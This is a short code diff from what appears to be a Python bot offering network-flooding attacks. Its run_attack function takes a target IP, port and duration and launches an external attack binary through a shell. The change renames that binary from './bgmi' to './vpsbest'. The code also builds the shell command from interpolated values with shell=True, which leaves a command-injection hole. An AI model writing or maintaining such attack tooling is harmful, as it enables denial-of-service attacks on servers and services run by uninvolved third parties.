@@ -728,7 +728,7 @@ async def run_attack(ip, port, time_duration, update, user_id):
     global current_attack_user, current_attack_end_time, attack_cooldown
 
     try:
-        command = f"./bgmi {ip} {port} {time_duration} {13} {default_thread}"
+        command = f"./vpsbest {ip} {port} {time_duration} {13} {default_thread}"
         process = subprocess.Popen(command, shell=True)
 
         await asyncio.sleep(time_duration)
